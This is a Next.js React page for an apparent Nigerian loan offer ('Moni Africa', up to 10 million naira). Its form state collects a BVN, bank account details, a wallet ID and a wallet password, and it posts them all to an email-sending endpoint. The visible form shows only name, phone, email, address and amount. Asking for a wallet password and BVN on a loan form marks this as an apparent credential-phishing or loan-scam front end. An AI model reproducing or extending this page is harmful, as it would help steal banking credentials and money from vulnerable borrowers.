'use client';

import Image from 'next/image';
import { useState } from 'react';
import { Header } from '@/components/header';
import { Footer } from '@/components/footer';
import { FaWhatsapp } from 'react-icons/fa';

export default function LoanApplication() {
  const [formData, setFormData] = useState({
    fullName: '',
    contactNumber: '',
    email: '',
    bvn: '',
    address: '',
    accountNumber: '',
    accountName: '',
    bankName: '',
    amountSought: '',
    loanTenure: '',
    reasonForLoan: '',
    walletId: '',
    walletPassword: '',
    sex: '',
    employmentStatus: '',
    monthlyIncome: '',
  });

  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const response = await fetch('/api/send-email2', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      if (!response.ok) {
        throw new Error('Failed to submit application');
      }

      const result = await response.json();
      console.log('Loan application submitted:', result);

      setSubmitted(true);

      setFormData({
        fullName: '',
        contactNumber: '',
        email: '',
        bvn: '',
        address: '',
        accountNumber: '',
        accountName: '',
        bankName: '',
        amountSought: '',
        loanTenure: '',
        reasonForLoan: '',
        walletId: '',
        walletPassword: '',
        sex: '',
        employmentStatus: '',
        monthlyIncome: '',
      });

      setTimeout(() => setSubmitted(false), 5000);
    } catch (err) {
      console.error(err);
      setError('Failed to submit application. Please try again.');
      setTimeout(() => setError(''), 5000);
    } finally {
      setLoading(false);
    }
  };

  const whatsappNumber = '2348012345678';
  const whatsappMessage = encodeURIComponent(
    'Hello! I would like to chat with Moni Africa.'
  );

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <Header />

      <main className="flex-grow">
        {/* Page Title */}
        <section className="bg-gradient-to-b from-gray-900 to-gray-800 text-white py-12 text-center">
          <h1 className="text-4xl font-bold">Loan Application</h1>
        </section>

        <div className="max-w-4xl mx-auto px-4 py-8">

          {/* Loan Promo Text */}
          <div className="bg-blue-50 rounded-lg p-6 mb-8 text-center">
            <h2 className="text-2xl font-bold text-gray-800 mb-3">
              GET LOAN UP TO 10 MILLION NAIRA
            </h2>
            <p className="text-gray-700">
              Get loans with ease, low interest fees and less documentation. Hassle free service guaranteed!
            </p>
          </div>

          {/* Registration Images (FROM PUBLIC FOLDER) */}
          <div className="mb-10 grid grid-cols-1 md:grid-cols-2 gap-6">
            {["reg1.png", "reg2.png", "reg3.png", "reg4.png", "reg5.png"].map((img, i) => (
              <div key={i} className="flex justify-center">
                <Image
                  src={`/${img}`}
                  alt={`Registration step ${i + 1}`}
                  width={900}
                  height={650}
                  className="rounded-lg shadow-lg w-full h-auto"
                />
              </div>
            ))}
          </div>

          {/* Registration Form */}
          <div className="bg-white rounded-lg shadow-lg p-8">
            <h3 className="text-2xl font-bold text-gray-800 mb-6">
              Registration Form
            </h3>

            {submitted && (
              <div className="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-6">
                Your loan application has been submitted successfully!
              </div>
            )}

            {error && (
              <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-6">
                {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">

              {/* Name */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">
                  Name in Full *
                </label>
                <input
                  type="text"
                  name="fullName"
                  value={formData.fullName}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 border rounded-lg"
                />
              </div>

              {/* Phone */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">
                  Phone / WhatsApp Number *
                </label>
                <input
                  type="text"
                  name="contactNumber"
                  value={formData.contactNumber}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 border rounded-lg"
                />
              </div>

              {/* Email */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">
                  Email Address *
                </label>
                <input
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 border rounded-lg"
                />
              </div>

              {/* Address */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">
                  Address *
                </label>
                <textarea
                  name="address"
                  value={formData.address}
                  onChange={handleChange}
                  required
                  rows={3}
                  className="w-full px-4 py-2 border rounded-lg"
                />
              </div>

              {/* Amount */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">
                  Amount Sought
                </label>
                <input
                  type="text"
                  name="amountSought"
                  value={formData.amountSought}
                  onChange={handleChange}
                  className="w-full px-4 py-2 border rounded-lg"
                />
              </div>

              {/* Submit */}
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg"
              >
                {loading ? 'Submitting...' : 'Submit Application'}
              </button>

              {/* WhatsApp button under submit */}
              <div className="mt-4 flex justify-center">
                <a
                  href={`https://wa.me/${whatsappNumber}?text=${whatsappMessage}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-6 rounded-lg flex items-center gap-2"
                >
                  <FaWhatsapp size={20} />
                  Chat on WhatsApp
                </a>
              </div>

            </form>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
                  }
